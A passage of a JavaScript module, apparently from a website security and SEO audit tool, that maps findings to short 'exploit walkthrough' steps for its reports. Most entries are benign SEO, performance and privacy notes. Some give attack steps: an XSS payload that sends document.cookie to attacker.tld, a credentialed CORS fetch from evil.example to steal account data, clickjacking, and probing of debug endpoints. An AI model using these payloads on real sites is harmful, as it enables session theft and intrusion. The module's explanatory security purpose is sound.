    'N/A to an attacker — indexing is blocked.',
    'Inspect the meta robots tag.',
    'It contains noindex.',
    'The page will not rank — deliberate or accidental.',
  ],
  'seo-noindex-header': [
    'N/A to an attacker — a header-level indexing block.',
    'Inspect the X-Robots-Tag response header.',
    'It contains noindex.',
    'Search engines drop the URL entirely.',
  ],
  'seo-canonical-cross-domain': [
    'N/A to an attacker — you de-rank your own site.',
    'Read the canonical link.',
    'It points at a different domain.',
    'Your ranking signals are passed away.',
  ],
  'seo-canonical-www-mismatch': [
    'N/A to an attacker — apex vs www canonical routing.',
    'Inspect the canonical link href vs the served host.',
    'One uses www and the other uses apex.',
    'Ensure 301 redirects align with your chosen canonical format.',
  ],
  'seo-hreflang-missing': [
    'N/A to an attacker — locale targeting is lost.',
    'Check for hreflang annotations on a multi-language site.',
    'None are present.',
    'Users get the wrong language in results.',
  ],
  'seo-hreflang-invalid': [
    'N/A to an attacker — the annotations are ignored.',
    'Validate each hreflang value against BCP-47.',
    'Malformed values are present.',
    'All hreflang signals are discarded.',
  ],
  'seo-hreflang-xdefault': [
    'N/A to an attacker — no fallback locale exists.',
    'Inspect the hreflang set.',
    'There is no x-default entry.',
    'Unmatched users get an arbitrary locale.',
  ],
  'seo-social-image': [
    'N/A to an attacker — share previews degrade.',
    'Check the og:image tag.',
    'No dedicated share image is set.',
    'Links share as plain text.',
  ],
  'seo-twitter-card': [
    'N/A to an attacker — X/Twitter previews degrade.',
    'Check the twitter:card metadata.',
    'It is absent.',
    'Posts show a bare link with lower click-through.',
  ],

  /* ---- performance: no attacker, user-experience cost ---- */
  'perf-longtasks': [
    'N/A to an attacker — main-thread responsiveness suffers.',
    'Record a performance trace during load.',
    'Long tasks block the main thread.',
    'Taps/clicks feel delayed; INP degrades.',
  ],
  'perf-transfer': [
    'N/A to an attacker — every user pays the bytes.',
    'Measure transfer size in DevTools.',
    'The page moves more bytes than it needs.',
    'Slow load and higher mobile data usage.',
  ],
  'perf-failed-requests': [
    'N/A to an attacker — assets or fetches break.',
    'Open the network tab and reload.',
    'One or more requests fail.',
    'Missing resources silently degrade features.',
  ],
  'perf-network-errors': [
    'N/A to an attacker — intermittent infrastructure trouble.',
    'Watch the network log across reloads.',
    'Network-level errors appear.',
    'Flaky UX and hidden partial outages.',
  ],
  'page-weight': [
    'N/A to an attacker — a pure performance cost.',
    'Measure total transferred bytes.',
    'The page is heavier than comparable sites.',
    'Slower load and a possible Core Web Vitals penalty.',
  ],
  'render-blocking': [
    'N/A to an attacker — first paint is delayed.',
    'Check for blocking CSS/JS in the head.',
    'Render is blocked until they download.',
    'Higher LCP/INP and measurable conversion loss.',
  ],
  'inline-scripts': [
    'An XSS injection gains a nonce-free execution context.',
    'Count the inline <script> blocks.',
    'A strict CSP is impossible without a nonce or hash.',
    'CSP cannot be hardened, so XSS stays easier to exploit.',
  ],
  'no-compression': [
    'N/A to an attacker — bandwidth waste.',
    'Inspect the Content-Encoding header.',
    'No gzip/brotli is applied.',
    'Larger payloads and slower load.',
  ],
  'no-cache': [
    'N/A to an attacker — repeat loads are slow.',
    'Inspect Cache-Control and ETag.',
    'No caching headers are set.',
    'Every visit re-downloads from the origin.',
  ],
  'img-format': [
    'N/A to an attacker — heavier image payloads.',
    'Check the served image formats.',
    'Images use legacy PNG/JPEG/GIF.',
    'Images are 30-60% larger than WebP/AVIF, hurting LCP.',
  ],
  'http-redirect': [
    'N/A to an attacker — extra round-trips.',
    'Follow the request chain.',
    'Multiple redirects precede the final page.',
    'Added latency and diluted link equity.',
  ],
  'deprecated': [
    'N/A to an attacker — dead or fragile tech.',
    'Grep the source for the deprecated API usage.',
    'It is present and still relied upon.',
    'Feature breakage when the browser removes support.',
  ],
  'dns-dnssec': [
    'Position yourself to spoof DNS (rogue resolver, cache poisoning).',
    'Answer with a forged record for the domain.',
    'There is no DNSSEC signature to reject it.',
    'Users are silently redirected to an attacker host.',
  ],
  'no-security-txt': [
    'N/A to an attacker — a disclosure-coordination gap.',
    'Request /.well-known/security.txt.',
    'It returns 404.',
    'Researchers have no private channel, so issues surface publicly or are sold.',
  ],
  'trackers': [
    'Load the page with a clean profile and the network tab open.',
    'Identify the third-party tracker requests.',
    'They collect behaviour and set identifiers.',
    'A GDPR/ePrivacy breach unless consent and a lawful basis exist.',
  ],
  'no-consent': [
    'Load the page with a clean profile.',
    'Observe trackers firing with no consent banner.',
    'Non-essential storage is set pre-consent.',
    'An ePrivacy Art. 5(3) + GDPR breach, demonstrable with a HAR file.',
  ],
  'consent-present': [
    'No exploit — informational.',
    'Confirm the CMP truly blocks pre-consent by checking the network log.',
    'Verify no tags fire before opt-in.',
    'A cosmetic banner that grants by default would still breach the rules.',
  ],
  'data-residency': [
    'Fingerprint the third-party infrastructure.',
    'Map each sub-processor to its region and transfer basis.',
    'A non-EU transfer may exist without documented safeguards.',
    'A GDPR Chapter V exposure if no SCC/DPA is in place.',
  ],
  'hdr-': [
    'Identify which recommended security header is missing.',
    'Craft the request the missing control would have stopped.',
    'Perform the browser-side attack (framing, MIME sniffing, referrer leak).',
    'Chain it with the other findings to escalate impact.',
  ],
  'hdr-x-content-type-options': [
    'Get a file with a non-HTML type served from your origin (upload, log, txt).',
    'Reference it so the browser sniffs and reinterprets it as HTML/script.',
    'Without nosniff the content executes in your origin.',
    'Stored XSS — cookie/session access for any victim who opens the URL.',
  ],
  'hdr-x-frame-options': [
    'Build an attacker page that embeds your site in a transparent iframe.',
    'Position a decoy button over a real logged-in control.',
    'The victim clicks what they think is a game or reward.',
    'They trigger a real action (transfer, delete, permission grant) unknowingly.',
  ],
  'hdr-referrer-policy': [
    'Find a page that carries a token in the URL (reset, invite, share).',
    'Embed a third-party resource on that page.',
    'The full URL is sent in the Referer header to the external host.',
    'Tokens leak to third parties and into their logs.',
  ],
  'hdr-permissions-policy': [
    'Identify a third-party script or iframe running on the page.',
    'It calls a powerful API (getUserMedia, geolocation).',
    'Without Permissions-Policy nothing restricts it.',
    'A compromised third party uses device permissions as the user.',
  ],
  'hdr-permissions-policy-overgrant': [
    'Read the Permissions-Policy header and find a `feature=*` grant.',
    'Embed a hostile iframe (or a compromised third party does).',
    'The embedder requests camera/mic/geolocation/USB under your origin.',
    'Device permissions are abused because the header allowed every origin.',
  ],
  'policy-': [
    'A regulator or user looks for the required policy link.',
    'It is missing from the site.',
    'Users cannot see how their data is handled.',
    'A GDPR Art. 12-14 transparency breach and DPA complaints.',
  ],
  'policy-privacy-policy': [
    'A user (or regulator) looks for how their data is processed.',
    'No privacy-policy link exists.',
    'The lawful basis, retention and rights are undocumented.',
    'A GDPR Art. 12-14 breach and a DPA complaint.',
  ],
  'policy-cookie-policy': [
    'A user inspects which cookies are set.',
    'No cookie-policy link exists.',
    'Purposes and lifetimes are undocumented.',
    'An ePrivacy / GDPR transparency breach.',
  ],
  'policy-terms': [
    'A user or consumer authority looks for the contractual terms.',
    'No terms-of-service link exists.',
    'There are no agreed ground rules or liability limits.',
    'Consumer-law exposure with no agreed terms to rely on.',
  ],
  'policy-imprint-company-info': [
    'A user tries to identify the site operator.',
    'No imprint / company-information page exists.',
    'The legal entity and contact are undisclosed.',
    'An EU legal-notice (imprint) compliance failure.',
  ],
  'csp-unsafe-inline': [
    'Find any reflected or stored input on the site (search, comment, profile, error page).',
    'Submit `<img src=x onerror="fetch(\'https://attacker.tld/c?\'+document.cookie)">` — unsafe-inline lets it run without a nonce.',
    'The payload reads cookies and localStorage and posts them to your collector.',
    'Replay the stolen session cookie to log in as the victim.',
  ],
  'csp-unsafe-eval': [
    'Locate a sink that evaluates strings: a JSON.parse polyfill, a template engine, or a library that passes data to Function()/eval().',
    'Feed it attacker-controlled text (a query parameter that ends up in that path).',
    'The string executes as JavaScript inside your origin.',
    'Use it to read the DOM, tokens and any API the victim is authenticated against.',
  ],
  'cors-credential-leak': [
    'Register `https://evil.example` and host one page with a fetch call.',
    'Send `fetch("https://target/api/me", {credentials:"include"})` — the browser attaches the victim\'s cookies.',
    'Because the API echoes `Access-Control-Allow-Origin: https://evil.example` with credentials, the response body is readable.',
    'Post the stolen JSON (email, tokens, billing data) to your server.',
  ],
  'sourcemap-exposed': [
    'Read `/` and collect every `/assets/*.js` bundle URL.',
    'Request `bundle.js.map` for each; a 200 means the full original source is public.',
    'Run `npx source-map-explorer` or `jq .sourcesContent` to reconstruct it.',
    'Grep the source for endpoints, feature flags, internal hostnames and hard-coded keys, then attack the hidden endpoints.',
  ],
  'debug-endpoints-exposed': [
    'Probe the usual paths: `/debug`, `/actuator/env`, `/actuator/heapdump`, `/graphql`, `/.well-known/...` extras.',
    'A 200 with structured output confirms the endpoint is live on production.',
    'Read environment properties, config or the schema — often including credentials.',
    'Use privileged operations (shutdown, env mutation, GraphQL mutations) if they are exposed without auth.',
  ],
};

const GENERIC_EXPLOIT = [
  'Confirm the issue with the captured evidence (raw header/body shown below).',
  'Reproduce it manually against the target with the command or request in the finding\'s fix.',
  'Chain it with the other findings in this report — most real compromises need two.',
];

function applyExplain(findings) {
  const keys = Object.keys(EXPLAIN);
  for (const f of findings) {
    const id = String(f.id);
    let ex = EXPLAIN[id];
    if (!ex) {
      // Try stripping one trailing instance suffix (cookie-insecure-sid → cookie-insecure).
      ex = EXPLAIN[id.replace(/-[^-]+$/, '')];
    }
    if (!ex) {
      // Longest prefix match (disclosure-x-powered-by → disclosure). A bare
      // prefix is allowed so dynamic ids that append a space or a header name
      // (policy-cookie policy, hdr-x-frame-options) resolve to their family
      // key (policy-, hdr-) instead of the generic fallback.
      const hit = keys
        .filter((k) => id === k || id.startsWith(k + '-') || id.startsWith(k))
        .sort((a, b) => b.length - a.length)[0];
      if (hit) ex = EXPLAIN[hit];
    }
    ex = ex || GENERIC_EXPLAIN;
    f.whatItIs = ex.whatItIs;
    f.whoCanAct = ex.whoCanAct;
    f.impact = ex.impact;
    f.worstCase = ex.worstCase;

    // Exploit walkthrough: exact attacker steps. Matching mirrors EXPLAIN but
    // uses startsWith so family prefixes like `policy-` also cover ids that
    // append a label with a space (`policy-privacy policy`).
    let steps = EXPLOIT[id];
    if (!steps) steps = EXPLOIT[id.replace(/-[^-]+$/, '')];
    if (!steps) {
      const ehit = Object.keys(EXPLOIT)
        .filter((k) => id === k || id.startsWith(k))
        .sort((a, b) => b.length - a.length)[0];
      if (ehit) steps = EXPLOIT[ehit];
    }
    f.exploitSteps = steps || GENERIC_EXPLOIT;
  }
  return findings;
}

const EXPLOIT_STEPS = EXPLOIT;

module.exports = {
  GENERIC_EXPLAIN,
  EXPLAIN,
  EXPLOIT,
  EXPLOIT_STEPS,
  GENERIC_EXPLOIT,
  applyExplain,
};
